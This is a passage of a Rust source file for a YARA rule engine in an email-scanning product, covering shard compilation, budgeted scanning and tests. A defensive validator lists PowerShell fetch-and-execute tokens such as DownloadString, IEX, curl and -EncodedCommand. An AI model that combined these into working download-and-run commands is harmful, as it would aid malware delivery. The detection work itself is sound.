//! YARA Engine - rule compilation + byte stream scanning.
//!
//! Compiles YARA rules into `yara_x::Rules` at startup,
//! then scans byte streams at runtime, returning matched rule lists.

use std::collections::{BTreeMap, HashSet};
use std::sync::Arc;
use std::time::{Duration, Instant};

use tracing::{info, warn};

use super::pack::{RuleBackend, RulePackLoad};
use super::rules::ALL_RULE_SOURCES;
use super::target::ScanTarget;

const MAX_RUNTIME_SHARDS: usize = 256;
const DEFAULT_ENFORCED_SCAN_BUDGET: Duration = Duration::from_secs(5);
const DEFAULT_SHADOW_SCAN_BUDGET: Duration = Duration::from_secs(2);

/// A single YARA match result.
#[derive(Debug, Clone)]
pub struct YaraMatch {
    /// YARA rule name (e.g. "VBA_Macro_AutoExec").
    pub rule_name: String,
    /// Rule meta.category value.
    pub category: String,
    /// Rule meta.severity value.
    pub severity: String,
    /// Rule meta.description value.
    pub description: String,
    /// Rule quality tier. Missing metadata on legacy/custom rules is treated
    /// conservatively instead of inheriting 98% confidence from severity.
    pub fidelity: String,
    /// Explicit hard-floor eligibility. This is opt-in and is still filtered
    /// by the verdict layer's category allowlist.
    pub breaker_eligible: bool,
}

impl YaraMatch {
    pub fn confidence(&self) -> f64 {
        match self.fidelity.as_str() {
            "exact" => 0.98,
            "high" => 0.90,
            "medium" => 0.78,
            "hunting" => 0.62,
            _ => match self.severity.as_str() {
                "critical" => 0.82,
                "high" => 0.74,
                "medium" => 0.68,
                _ => 0.60,
            },
        }
    }
}

struct CompiledShard {
    id: String,
    target: ScanTarget,
    rules: CompiledRuleSet,
    rule_count: usize,
    quality_tier: String,
    enforce: bool,
}

enum CompiledRuleSet {
    YaraX(Arc<yara_x::Rules>),
    LibYara(Arc<::yara::Rules>),
}

#[derive(Debug, Default)]
pub struct YaraScanOutcome {
    pub matches: Vec<YaraMatch>,
    pub shadow_matches: Vec<YaraMatch>,
    pub shards_scanned: usize,
    pub rules_selected: usize,
    pub failed_shards: Vec<String>,
    pub budget_exhausted: bool,
    pub shadow_failed_shards: Vec<String>,
    pub shadow_budget_exhausted: bool,
}

/// YARA Engine: immutable built-ins plus independently compiled target shards.
pub struct YaraEngine {
    common_rules: Arc<yara_x::Rules>,
    common_rule_count: usize,
    shards: Vec<CompiledShard>,
    rule_count: usize,
    pack_rule_count: usize,
    quarantined_shards: Vec<String>,
    generation: Option<String>,
    enforced_scan_budget: Duration,
    shadow_scan_budget: Duration,
}

/// Extract a string value for the given key from a metadata vector.
fn extract_meta_str(meta: &[(&str, yara_x::MetaValue<'_>)], key: &str) -> Option<String> {
    meta.iter()
        .find(|(k, _)| *k == key)
        .and_then(|(_, v)| match v {
            yara_x::MetaValue::String(s) => Some(s.to_string()),
            _ => None,
        })
}

impl YaraEngine {
    /// Compile built-in rules and return an engine instance.
    /// Rule sources that fail to compile are skipped with a warning; the engine still starts.
    pub fn new() -> Result<Self, String> {
        Self::new_with_pack(&[], RulePackLoad::empty())
    }

    /// Scan byte stream against every shard. This compatibility path is used
    /// by rule tests and administrative validation. Production email scanning
    /// uses `scan_target_detailed` so irrelevant target shards are skipped.
    pub fn scan(&self, data: &[u8]) -> Vec<YaraMatch> {
        let outcome = self.scan_selected(data, None);
        outcome
            .matches
            .into_iter()
            .chain(outcome.shadow_matches)
            .collect()
    }

    pub fn scan_target(&self, data: &[u8], target: ScanTarget) -> Vec<YaraMatch> {
        self.scan_target_detailed(data, target).matches
    }

    pub fn scan_target_detailed(&self, data: &[u8], target: ScanTarget) -> YaraScanOutcome {
        self.scan_selected(data, Some(target))
    }

    fn scan_selected(&self, data: &[u8], target: Option<ScanTarget>) -> YaraScanOutcome {
        let mut outcome = YaraScanOutcome::default();
        let mut seen = HashSet::new();
        let mut shadow_seen = HashSet::new();

        let enforced_started = Instant::now();
        match scan_yara_x(
            &self.common_rules,
            data,
            self.enforced_scan_budget,
            "legacy",
        ) {
            Ok(matches) => append_unique(&mut outcome.matches, matches, &mut seen),
            Err(error) => outcome.failed_shards.push(format!("builtin: {error}")),
        }
        outcome.shards_scanned += 1;
        outcome.rules_selected += self.common_rule_count;

        for shard in self
            .shards
            .iter()
            .filter(|shard| shard.enforce && shard_matches_target(shard, target))
        {
            let Some(remaining) = self
                .enforced_scan_budget
                .checked_sub(enforced_started.elapsed())
            else {
                outcome.budget_exhausted = true;
                break;
            };
            if remaining.is_zero() {
                outcome.budget_exhausted = true;
                break;
            }
            match scan_compiled(&shard.rules, data, remaining, &shard.quality_tier) {
                Ok(matches) => append_unique(&mut outcome.matches, matches, &mut seen),
                Err(error) => outcome.failed_shards.push(format!("{}: {error}", shard.id)),
            }
            outcome.shards_scanned += 1;
            outcome.rules_selected += shard.rule_count;
        }

        // Community packs are additive telemetry until explicitly promoted.
        // They receive an independent, smaller budget so a slow native shard
        // cannot consume the production completeness budget above.
        let shadow_started = Instant::now();
        for shard in self
            .shards
            .iter()
            .filter(|shard| !shard.enforce && shard_matches_target(shard, target))
        {
            let Some(remaining) = self
                .shadow_scan_budget
                .checked_sub(shadow_started.elapsed())
            else {
                outcome.shadow_budget_exhausted = true;
                break;
            };
            if remaining.is_zero() {
                outcome.shadow_budget_exhausted = true;
                break;
            }
            match scan_compiled(&shard.rules, data, remaining, &shard.quality_tier) {
                Ok(matches) => {
                    append_unique(&mut outcome.shadow_matches, matches, &mut shadow_seen)
                }
                Err(error) => outcome
                    .shadow_failed_shards
                    .push(format!("{}: {error}", shard.id)),
            }
            outcome.shards_scanned += 1;
            outcome.rules_selected += shard.rule_count;
        }

        outcome
    }

    /// Compile built-ins, administrator-authored sources, and a validated
    /// runtime pack. Every non-built-in source is an independent immutable
    /// shard, so one incompatible feed cannot disable unrelated rules.
    pub fn new_with_pack(custom_sources: &[String], pack: RulePackLoad) -> Result<Self, String> {
        let RulePackLoad {
            pack_id,
            generation,
            generated_at: _,
            min_engine_version: _,
            sources: pack_sources,
            declared_rules,
            rejected_sources,
            manifest_path,
        } = pack;
        let mut compiler = yara_x::Compiler::new();
        let mut failed_sources = 0u32;

        for (category, source) in ALL_RULE_SOURCES {
            match compiler.add_source(*source) {
                Ok(_) => {
                    info!(
                        category = *category,
                        "YARA rule source compiled successfully"
                    );
                }
                Err(e) => {
                    failed_sources += 1;
                    warn!(
                        category = *category,
                        error = %e,
                        "YARA rule source compilation failed, skipped"
                    );
                }
            }
        }

        let common_rules = compiler.build();
        let builtin_rule_count = common_rules.iter().count();

        if builtin_rule_count == 0 && failed_sources > 0 {
            return Err("All YARA rule sources failed to compile".to_string());
        }

        let mut shards = Vec::new();
        let pack_manifest_present = manifest_path.is_some();
        let mut pack_generation_valid = !pack_manifest_present || rejected_sources.is_empty();
        let mut quarantined_shards = rejected_sources;
        for (index, source) in custom_sources.iter().enumerate() {
            if shards.len() >= MAX_RUNTIME_SHARDS {
                quarantined_shards.push("custom shard limit reached".to_string());
                break;
            }
            let id = format!("custom-{index:04}");
            match compile_shard(
                &id,
                source,
                ScanTarget::Generic,
                RuleBackend::YaraX,
                "legacy",
                true,
            ) {
                Ok(shard) => shards.push(shard),
                Err(error) => quarantined_shards.push(error),
            }
        }

        let mut grouped_pack_sources: BTreeMap<
            (RuleBackend, ScanTarget, String, bool),
            Vec<super::pack::LoadedRuleSource>,
        > = BTreeMap::new();
        for source in pack_sources {
            grouped_pack_sources
                .entry((
                    source.backend,
                    source.target,
                    source.quality_tier.clone(),
                    source.enforce,
                ))
                .or_default()
                .push(source);
        }

        let mut pack_shards = Vec::new();
        let mut compiled_pack_rules = 0usize;
        for ((backend, target, quality_tier, enforce), sources) in grouped_pack_sources {
            if shards.len() + pack_shards.len() >= MAX_RUNTIME_SHARDS {
                quarantined_shards.push("runtime shard limit reached".to_string());
                pack_generation_valid = false;
                break;
            }
            let id = format!(
                "pack-{}-{}-{}",
                backend.as_str(),
                target.as_str(),
                quality_tier
            );
            let expected_rule_count = sources
                .iter()
                .map(|source| source.expected_rule_count)
                .sum::<usize>();
            let source_texts = sources
                .iter()
                .map(|source| source.source.as_str())
                .collect::<Vec<_>>();
            match compile_shard_sources(&id, &source_texts, target, backend, &quality_tier, enforce)
            {
                Ok(shard) if shard.rule_count == expected_rule_count => {
                    compiled_pack_rules += shard.rule_count;
                    info!(
                        shard = %id,
                        target = target.as_str(),
                        backend = backend.as_str(),
                        rules = shard.rule_count,
                        source_shards = sources.len(),
                        quality = %quality_tier,
                        "Validated and merged YARA pack shards"
                    );
                    pack_shards.push(shard);
                }
                Ok(shard) => {
                    pack_generation_valid = false;
                    quarantined_shards.push(format!(
                        "{id}: compiled {} rules but manifests declared {expected_rule_count}",
                        shard.rule_count
                    ));
                }
                Err(error) => {
                    pack_generation_valid = false;
                    quarantined_shards.push(error);
                }
            }
        }

        let minimum_pack_rules = std::env::var("YARA_PACK_MIN_RULES")
            .ok()
            .and_then(|value| value.parse::<usize>().ok())
            .unwrap_or(0);
        if compiled_pack_rules != declared_rules {
            pack_generation_valid = false;
            if pack_manifest_present {
                quarantined_shards.push(format!(
                    "pack generation rejected: compiled {compiled_pack_rules} of {declared_rules} declared rules"
                ));
            }
        }
        if compiled_pack_rules < minimum_pack_rules {
            pack_generation_valid = false;
            if pack_manifest_present {
                quarantined_shards.push(format!(
                    "pack generation rejected: compiled {compiled_pack_rules} rules below required {minimum_pack_rules}"
                ));
            }
        }
        let active_generation = if pack_generation_valid {
            generation
        } else {
            compiled_pack_rules = 0;
            None
        };
        if pack_generation_valid {
            pack_shards.sort_by_key(|shard| shadow_quality_priority(&shard.quality_tier));
            shards.extend(pack_shards);
        }

        let total_rules =
            builtin_rule_count + shards.iter().map(|shard| shard.rule_count).sum::<usize>();

        info!(
            rule_count = total_rules,
            builtin_rules = builtin_rule_count,
            pack_rules = compiled_pack_rules,
            shard_count = shards.len(),
            failed_sources = failed_sources,
            quarantined = quarantined_shards.len(),
            pack_id = pack_id.as_deref().unwrap_or("none"),
            generation = active_generation.as_deref().unwrap_or("builtin"),
            declared_pack_rules = declared_rules,
            "YARA engine generation initialized"
        );

        Ok(Self {
            common_rules: Arc::new(common_rules),
            common_rule_count: builtin_rule_count,
            shards,
            rule_count: total_rules,
            pack_rule_count: compiled_pack_rules,
            quarantined_shards,
            generation: active_generation,
            enforced_scan_budget: DEFAULT_ENFORCED_SCAN_BUDGET,
            shadow_scan_budget: DEFAULT_SHADOW_SCAN_BUDGET,
        })
    }

    /// Compile from built-in + custom rule sources (merged from DB).
    pub fn new_with_custom(custom_sources: &[String]) -> Result<Self, String> {
        Self::new_with_pack(custom_sources, RulePackLoad::empty())
    }

    /// Total number of compiled rules.
    pub fn rule_count(&self) -> usize {
        self.rule_count
    }

    pub fn pack_rule_count(&self) -> usize {
        self.pack_rule_count
    }

    pub fn shard_count(&self) -> usize {
        self.shards.len()
    }

    pub fn quarantined_shards(&self) -> &[String] {
        &self.quarantined_shards
    }

    pub fn generation(&self) -> Option<&str> {
        self.generation.as_deref()
    }

    #[cfg(test)]
    pub(crate) fn with_scan_budgets(mut self, enforced: Duration, shadow: Duration) -> Self {
        self.enforced_scan_budget = enforced;
        self.shadow_scan_budget = shadow;
        self
    }
}

fn shard_matches_target(shard: &CompiledShard, target: Option<ScanTarget>) -> bool {
    !target.is_some_and(|target| shard.target != ScanTarget::Generic && shard.target != target)
}

fn shadow_quality_priority(quality_tier: &str) -> u8 {
    match quality_tier {
        "exact" => 0,
        "high" => 1,
        "medium" => 2,
        "legacy" => 3,
        "hunting" => 4,
        "high_cost" => 5,
        _ => 6,
    }
}

fn compile_shard(
    id: &str,
    source: &str,
    target: ScanTarget,
    backend: RuleBackend,
    quality_tier: &str,
    enforce: bool,
) -> Result<CompiledShard, String> {
    compile_shard_sources(id, &[source], target, backend, quality_tier, enforce)
}

fn compile_shard_sources(
    id: &str,
    sources: &[&str],
    target: ScanTarget,
    backend: RuleBackend,
    quality_tier: &str,
    enforce: bool,
) -> Result<CompiledShard, String> {
    let (rules, rule_count) = match backend {
        RuleBackend::YaraX => {
            let mut compiler = yara_x::Compiler::new();
            for source in sources {
                compiler
                    .add_source(*source)
                    .map_err(|error| format!("{id}: YARA-X compile failed: {error}"))?;
            }
            let rules = compiler.build();
            let rule_count = rules.iter().count();
            (CompiledRuleSet::YaraX(Arc::new(rules)), rule_count)
        }
        RuleBackend::LibYara => {
            let mut compiler = ::yara::Compiler::new()
                .map_err(|error| format!("{id}: libyara initialize failed: {error}"))?;
            for source in sources {
                compiler = compiler
                    .add_rules_str(source)
                    .map_err(|error| format!("{id}: libyara compile failed: {error}"))?;
            }
            let rules = compiler
                .compile_rules()
                .map_err(|error| format!("{id}: libyara finalize failed: {error}"))?;
            let rule_count = rules.get_rules().len();
            (CompiledRuleSet::LibYara(Arc::new(rules)), rule_count)
        }
    };
    if rule_count == 0 {
        return Err(format!("{id}: source compiled zero rules"));
    }
    Ok(CompiledShard {
        id: id.to_string(),
        target,
        rules,
        rule_count,
        quality_tier: quality_tier.to_string(),
        enforce,
    })
}

fn scan_compiled(
    rules: &CompiledRuleSet,
    data: &[u8],
    timeout: Duration,
    default_fidelity: &str,
) -> Result<Vec<YaraMatch>, String> {
    match rules {
        CompiledRuleSet::YaraX(rules) => scan_yara_x(rules, data, timeout, default_fidelity),
        CompiledRuleSet::LibYara(rules) => scan_libyara(rules, data, timeout, default_fidelity),
    }
}

fn scan_yara_x(
    rules: &yara_x::Rules,
    data: &[u8],
    timeout: Duration,
    default_fidelity: &str,
) -> Result<Vec<YaraMatch>, String> {
    let mut scanner = yara_x::Scanner::new(rules);
    scanner.set_timeout(timeout.max(Duration::from_millis(1)));
    let scan_results = scanner.scan(data).map_err(|error| {
        warn!(error = %error, "YARA shard scan failed");
        error.to_string()
    })?;

    let matches = scan_results
        .matching_rules()
        .map(|rule| {
            let meta: Vec<(&str, yara_x::MetaValue<'_>)> = rule.metadata().collect();
            let category = extract_meta_str(&meta, "category").unwrap_or_default();
            let severity =
                extract_meta_str(&meta, "severity").unwrap_or_else(|| "high".to_string());
            let description = extract_meta_str(&meta, "description").unwrap_or_default();
            let fidelity =
                extract_meta_str(&meta, "fidelity").unwrap_or_else(|| default_fidelity.to_string());
            let breaker_eligible = extract_meta_str(&meta, "breaker")
                .is_some_and(|value| value.eq_ignore_ascii_case("true"));

            YaraMatch {
                rule_name: rule.identifier().to_string(),
                category,
                severity,
                description,
                fidelity,
                breaker_eligible,
            }
        })
        .collect();

    Ok(filter_context_sensitive_matches(matches, data))
}

fn scan_libyara(
    rules: &::yara::Rules,
    data: &[u8],
    timeout: Duration,
    default_fidelity: &str,
) -> Result<Vec<YaraMatch>, String> {
    let seconds = timeout
        .as_secs()
        .saturating_add(u64::from(timeout.subsec_nanos() > 0))
        .clamp(1, i32::MAX as u64) as i32;
    let matches = rules.scan_mem(data, seconds).map_err(|error| {
        warn!(error = %error, "libyara shard scan failed");
        error.to_string()
    })?;

    let matches = matches
        .into_iter()
        .map(|rule| {
            let meta_string = |key: &str| {
                rule.metadatas.iter().find_map(|meta| {
                    if meta.identifier != key {
                        return None;
                    }
                    match &meta.value {
                        ::yara::MetadataValue::String(value) => Some((*value).to_string()),
                        _ => None,
                    }
                })
            };
            YaraMatch {
                rule_name: rule.identifier.to_string(),
                category: meta_string("category").unwrap_or_default(),
                severity: meta_string("severity").unwrap_or_else(|| "high".to_string()),
                description: meta_string("description").unwrap_or_default(),
                fidelity: meta_string("fidelity").unwrap_or_else(|| default_fidelity.to_string()),
                // Governed native community packs are shadow-only. Even if an
                // upstream rule carries similarly named metadata, it cannot
                // opt itself into Vigilyx's hard-floor trust boundary.
                breaker_eligible: false,
            }
        })
        .collect();

    Ok(filter_context_sensitive_matches(matches, data))
}

/// A small number of built-in rules describe a relationship between tokens,
/// not a bag of unrelated words. Keep that relationship outside the YARA
/// source when expressing it there would require an expensive unbounded regex.
/// The raw YARA match remains the candidate generator; this validator only
/// rejects candidates whose required terms are not in one bounded context.
fn filter_context_sensitive_matches(matches: Vec<YaraMatch>, data: &[u8]) -> Vec<YaraMatch> {
    matches
        .into_iter()
        .filter(|matched| match matched.rule_name.as_str() {
            "PowerShell_Download_Exec" => powershell_download_exec_is_local(data),
            _ => true,
        })
        .collect()
}

fn contains_ascii_ci(data: &[u8], needles: &[&[u8]]) -> bool {
    needles.iter().any(|needle| {
        !needle.is_empty()
            && data
                .windows(needle.len())
                .any(|window| window.eq_ignore_ascii_case(needle))
    })
}

fn ascii_ci_positions(data: &[u8], needles: &[&[u8]], limit: usize) -> Vec<usize> {
    let mut positions = Vec::new();
    for needle in needles {
        if needle.is_empty() || needle.len() > data.len() {
            continue;
        }
        for (offset, window) in data.windows(needle.len()).enumerate() {
            if window.eq_ignore_ascii_case(needle) {
                positions.push(offset);
                if positions.len() >= limit {
                    positions.sort_unstable();
                    positions.dedup();
                    return positions;
                }
            }
        }
    }
    positions.sort_unstable();
    positions.dedup();
    positions
}

fn powershell_download_exec_is_local(data: &[u8]) -> bool {
    const LOCALITY_RADIUS: usize = 4096;
    const MAX_LAUNCHER_OCCURRENCES: usize = 256;
    const LAUNCHERS: &[&[u8]] = &[b"powershell", b"pwsh"];
    const DELIVERY: &[&[u8]] = &[
        b"DownloadString",
        b"DownloadFile",
        b"Invoke-WebRequest",
        b"wget",
        b"curl",
        b"-EncodedCommand",
    ];
    const EXECUTION: &[&[u8]] = &[
        b"Invoke-Expression",
        b"IEX",
        b"Start-Process",
        b"-ExecutionPolicy",
        b"-WindowStyle Hidden",
    ];

    let launcher_positions = ascii_ci_positions(data, LAUNCHERS, MAX_LAUNCHER_OCCURRENCES);
    // Do not let an attacker evade the relationship validator by padding the
    // file with more launcher tokens than the bounded position collector can
    // retain. At this density the original three-part YARA compound remains a
    // conservative match; normal documents and the historical random-blob
    // false positives stay on the bounded-locality path below.
    if launcher_positions.len() >= MAX_LAUNCHER_OCCURRENCES {
        return true;
    }

    launcher_positions.into_iter().any(|launcher_offset| {
        let start = launcher_offset.saturating_sub(LOCALITY_RADIUS);
        let end = launcher_offset
            .saturating_add(LOCALITY_RADIUS)
            .min(data.len());
        let window = &data[start..end];
        contains_ascii_ci(window, DELIVERY) && contains_ascii_ci(window, EXECUTION)
    })
}

fn append_unique(
    output: &mut Vec<YaraMatch>,
    incoming: Vec<YaraMatch>,
    seen: &mut HashSet<String>,
) {
    for matched in incoming {
        if seen.insert(matched.rule_name.clone()) {
            output.push(matched);
        }
    }
}

// Tests

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_engine_compiles_all_rules() {
        let engine = YaraEngine::new().expect("YARA engine should initialize successfully");
        assert!(engine.rule_count() > 0, "Should have built-in rules");
        println!("Compiled {} YARA rules", engine.rule_count());
    }

    #[test]
    fn target_routing_scans_only_common_and_relevant_shards() {
        let pack = RulePackLoad {
            pack_id: Some("routing-test".to_string()),
            generation: Some("g1".to_string()),
            sources: vec![
                crate::yara::pack::LoadedRuleSource {
                    shard_id: "pdf-000".to_string(),
                    target: ScanTarget::Pdf,
                    backend: RuleBackend::YaraX,
                    source: r#"rule routed_pdf { meta: category = "test" severity = "low" strings: $a = "PDF_ONLY_MARKER" condition: $a }"#.to_string(),
                    expected_rule_count: 1,
                    license: "MIT".to_string(),
                    provenance: "test".to_string(),
                    version: "g1".to_string(),
                    quality_tier: "high".to_string(),
                    enforce: true,
                },
                crate::yara::pack::LoadedRuleSource {
                    shard_id: "script-000".to_string(),
                    target: ScanTarget::Script,
                    backend: RuleBackend::YaraX,
                    source: r#"rule routed_script { meta: category = "test" severity = "low" strings: $a = "SCRIPT_ONLY_MARKER" condition: $a }"#.to_string(),
                    expected_rule_count: 1,
                    license: "MIT".to_string(),
                    provenance: "test".to_string(),
                    version: "g1".to_string(),
                    quality_tier: "high".to_string(),
                    enforce: true,
                },
            ],
            declared_rules: 2,
            ..RulePackLoad::default()
        };
        let engine = YaraEngine::new_with_pack(&[], pack).unwrap();
        let both = b"PDF_ONLY_MARKER SCRIPT_ONLY_MARKER";

        let pdf = engine.scan_target_detailed(both, ScanTarget::Pdf);
        assert!(
            pdf.matches
                .iter()
                .any(|matched| matched.rule_name == "routed_pdf")
        );
        assert!(
            !pdf.matches
                .iter()
                .any(|matched| matched.rule_name == "routed_script")
        );
        assert_eq!(pdf.shards_scanned, 2);

        let administrative = engine.scan(both);
        assert!(
            administrative
                .iter()
                .any(|matched| matched.rule_name == "routed_pdf")
        );
        assert!(
            administrative
                .iter()
                .any(|matched| matched.rule_name == "routed_script")
        );
    }

    #[test]
    fn incompatible_shard_is_quarantined_without_disabling_builtin_rules() {
        let pack = RulePackLoad {
            pack_id: Some("quarantine-test".to_string()),
            generation: Some("g2".to_string()),
            sources: vec![crate::yara::pack::LoadedRuleSource {
                shard_id: "broken".to_string(),
                target: ScanTarget::Generic,
                backend: RuleBackend::YaraX,
                source: "rule broken { condition:".to_string(),
                expected_rule_count: 1,
                license: "MIT".to_string(),
                provenance: "test".to_string(),
                version: "g2".to_string(),
                quality_tier: "legacy".to_string(),
                enforce: false,
            }],
            declared_rules: 1,
            ..RulePackLoad::default()
        };
        let engine = YaraEngine::new_with_pack(&[], pack).unwrap();
        assert_eq!(engine.pack_rule_count(), 0);
        assert!(!engine.quarantined_shards().is_empty());
        let eicar = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
        assert!(
            engine
                .scan_target(eicar, ScanTarget::Generic)
                .iter()
                .any(|matched| matched.rule_name == "EICAR_Test_File")
        );
    }

    #[test]
    fn one_broken_shard_rejects_the_entire_pack_generation() {
        let pack = RulePackLoad {
            pack_id: Some("atomic-test".to_string()),
            generation: Some("g3".to_string()),
            sources: vec![
                crate::yara::pack::LoadedRuleSource {
                    shard_id: "good".to_string(),
                    target: ScanTarget::Generic,
                    backend: RuleBackend::YaraX,
                    source:
                        r#"rule atomic_good { strings: $a = "ATOMIC_GOOD_MARKER" condition: $a }"#
                            .to_string(),
                    expected_rule_count: 1,
                    license: "MIT".to_string(),
                    provenance: "test".to_string(),
                    version: "g3".to_string(),
                    quality_tier: "legacy".to_string(),
                    enforce: true,
                },
                crate::yara::pack::LoadedRuleSource {
                    shard_id: "broken".to_string(),
                    target: ScanTarget::Generic,
                    backend: RuleBackend::YaraX,
                    source: "rule atomic_broken { condition:".to_string(),
                    expected_rule_count: 1,
                    license: "MIT".to_string(),
                    provenance: "test".to_string(),
                    version: "g3".to_string(),
                    quality_tier: "legacy".to_string(),
                    enforce: true,
                },
            ],
            declared_rules: 2,
            manifest_path: Some("/tmp/atomic-test/manifest.json".into()),
            ..RulePackLoad::default()
        };

        let engine = YaraEngine::new_with_pack(&[], pack).unwrap();
        assert_eq!(engine.pack_rule_count(), 0);
        assert_eq!(engine.generation(), None);
        assert!(
            !engine
                .scan_target(b"ATOMIC_GOOD_MARKER", ScanTarget::Generic)
                .iter()
                .any(|matched| matched.rule_name == "atomic_good")
        );
    }

    #[test]
    fn shadow_pack_matches_are_observable_but_not_enforced() {
        let pack = RulePackLoad {
            pack_id: Some("shadow-test".to_string()),
            generation: Some("g4".to_string()),
            sources: vec![crate::yara::pack::LoadedRuleSource {
                shard_id: "shadow".to_string(),
                target: ScanTarget::Generic,
                backend: RuleBackend::YaraX,
                source: r#"rule shadow_hit { strings: $a = "SHADOW_ONLY_MARKER" condition: $a }"#
                    .to_string(),
                expected_rule_count: 1,
                license: "MIT".to_string(),
                provenance: "test".to_string(),
                version: "g4".to_string(),
                quality_tier: "legacy".to_string(),
                enforce: false,
            }],
            declared_rules: 1,
            ..RulePackLoad::default()
        };

        let engine = YaraEngine::new_with_pack(&[], pack).unwrap();
        let outcome = engine.scan_target_detailed(b"SHADOW_ONLY_MARKER", ScanTarget::Generic);
        assert!(outcome.matches.is_empty());
        assert!(
            outcome
                .shadow_matches
                .iter()
                .any(|matched| matched.rule_name == "shadow_hit")
        );
    }

    #[test]
    fn exhausted_shadow_budget_does_not_poison_enforced_coverage() {
        let pack = RulePackLoad {
            pack_id: Some("shadow-budget-test".to_string()),
            generation: Some("g5".to_string()),
            sources: vec![crate::yara::pack::LoadedRuleSource {
                shard_id: "shadow".to_string(),
                target: ScanTarget::Generic,
                backend: RuleBackend::YaraX,
                source: r#"rule shadow_budget_hit { strings: $a = "SHADOW_BUDGET_MARKER" condition: $a }"#
                    .to_string(),
                expected_rule_count: 1,
                license: "MIT".to_string(),
                provenance: "test".to_string(),
                version: "g5".to_string(),
                quality_tier: "legacy".to_string(),
                enforce: false,
            }],
            declared_rules: 1,
            ..RulePackLoad::default()
        };

        let engine = YaraEngine::new_with_pack(&[], pack)
            .unwrap()
            .with_scan_budgets(DEFAULT_ENFORCED_SCAN_BUDGET, Duration::ZERO);
        let outcome = engine.scan_target_detailed(b"SHADOW_BUDGET_MARKER", ScanTarget::Generic);

        assert!(outcome.matches.is_empty());
        assert!(outcome.shadow_matches.is_empty());
        assert!(outcome.failed_shards.is_empty());
        assert!(!outcome.budget_exhausted);
        assert!(outcome.shadow_failed_shards.is_empty());
        assert!(outcome.shadow_budget_exhausted);
    }

    #[test]
    fn shadow_quality_order_runs_expensive_tiers_last() {
        assert!(shadow_quality_priority("exact") < shadow_quality_priority("legacy"));
        assert!(shadow_quality_priority("legacy") < shadow_quality_priority("hunting"));
        assert!(shadow_quality_priority("hunting") < shadow_quality_priority("high_cost"));
    }

    #[test]
    fn common_rule_syntax_normalizes_equivalent_matches_across_backends() {
        let source = r#"
rule dual_backend_marker {
    meta:
        category = "compatibility"
        severity = "medium"
        description = "dual verifier fixture"
    strings:
        $marker = "VIGILYX_DUAL_BACKEND_MARKER"
    condition:
        $marker
}
"#;
        let yarax = compile_shard(
            "dual-yarax",
            source,
            ScanTarget::Generic,
            RuleBackend::YaraX,
            "legacy",
            false,
        )
        .unwrap();
        let native = compile_shard(
            "dual-native",
            source,
            ScanTarget::Generic,
            RuleBackend::LibYara,
            "legacy",
            false,
        )
        .unwrap();
        let sample = b"prefix VIGILYX_DUAL_BACKEND_MARKER suffix";
        let yarax_matches = scan_compiled(
            &yarax.rules,
            sample,
            Duration::from_secs(1),
            &yarax.quality_tier,
        )
        .unwrap();
        let native_matches = scan_compiled(
            &native.rules,
            sample,
            Duration::from_secs(1),
            &native.quality_tier,
        )
        .unwrap();

        assert_eq!(yarax_matches.len(), 1);
        assert_eq!(native_matches.len(), 1);
        assert_eq!(yarax_matches[0].rule_name, native_matches[0].rule_name);
        assert_eq!(yarax_matches[0].category, native_matches[0].category);
        assert_eq!(yarax_matches[0].severity, native_matches[0].severity);
        assert_eq!(yarax_matches[0].description, native_matches[0].description);
        assert!(!native_matches[0].breaker_eligible);
    }

    #[test]
    fn native_backend_supports_the_pe_module_without_enabling_it_in_yarax() {
        let source = r#"import "pe"
rule native_pe_fixture {
    condition:
        pe.is_pe
}
"#;
        let native = compile_shard(
            "native-pe",
            source,
            ScanTarget::Executable,
            RuleBackend::LibYara,
            "hunting",
            false,
        )
        .unwrap();
        let mut pe = vec![0u8; 0x200];
        pe[0..2].copy_from_slice(b"MZ");
        pe[0x3c..0x40].copy_from_slice(&(0x80u32).to_le_bytes());
        pe[0x80..0x84].copy_from_slice(b"PE\0\0");
        pe[0x84..0x86].copy_from_slice(&(0x14cu16).to_le_bytes());
        pe[0x86..0x88].copy_from_slice(&(1u16).to_le_bytes());
        pe[0x94..0x96].copy_from_slice(&(0xe0u16).to_le_bytes());
        pe[0x96..0x98].copy_from_slice(&(0x0102u16).to_le_bytes());
        pe[0x98..0x9a].copy_from_slice(&(0x10bu16).to_le_bytes());

        let matches = scan_compiled(
            &native.rules,
            &pe,
            Duration::from_secs(1),
            &native.quality_tier,
        )
        .unwrap();
        assert!(
            matches
                .iter()
                .any(|matched| matched.rule_name == "native_pe_fixture")
        );
        assert!(matches.iter().all(|matched| !matched.breaker_eligible));

        let mut yarax = yara_x::Compiler::new();
        assert!(yarax.add_source(source).is_err());
    }

    #[test]
    #[ignore = "requires YARA_TEST_PACK_MANIFEST pointing at a governed generated pack"]
    fn governed_pack_loads_at_least_ten_thousand_native_rules() {
        let manifest = std::env::var("YARA_TEST_PACK_MANIFEST")
            .expect("YARA_TEST_PACK_MANIFEST must name the generated manifest");
        let pack = RulePackLoad::load(std::path::Path::new(&manifest)).unwrap();
        assert!(pack.declared_rules >= 10_000);
        assert!(
            pack.sources
                .iter()
                .all(|source| source.backend == RuleBackend::LibYara && !source.enforce)
        );
        let compile_started = Instant::now();
        let engine = YaraEngine::new_with_pack(&[], pack).unwrap();
        let compile_elapsed = compile_started.elapsed();
        assert!(
            engine.pack_rule_count() >= 10_000,
            "pack rejected: {:?}",
            engine.quarantined_shards()
        );
        assert!(engine.quarantined_shards().is_empty());

        for size in [100 * 1024, 1024 * 1024] {
            let mut benign = vec![b' '; size];
            let marker = b"Vigilyx governed YARA performance fixture";
            benign[..marker.len()].copy_from_slice(marker);
            let scan_started = Instant::now();
            let outcome = engine.scan_target_detailed(&benign, ScanTarget::Office);
            let scan_elapsed = scan_started.elapsed();
            assert!(
                !outcome.budget_exhausted,
                "{size}-byte scan exhausted budget"
            );
            assert!(
                outcome.failed_shards.is_empty(),
                "{:?}",
                outcome.failed_shards
            );
            assert!(outcome.rules_selected >= 10_000);
            assert!(outcome.shards_scanned <= 4, "pack shards were not merged");
            println!(
                "governed-pack benchmark bytes={size} compile_ms={} scan_ms={} rules={} runtime_sets={}",
                compile_elapsed.as_millis(),
                scan_elapsed.as_millis(),
                outcome.rules_selected,
                outcome.shards_scanned
            );
        }
    }

    #[test]
    #[ignore = "requires YARA_TEST_PACK_MANIFEST and records a comparative benchmark"]
    fn benchmark_real_compatible_shard_across_backends() {
        let manifest = std::env::var("YARA_TEST_PACK_MANIFEST")
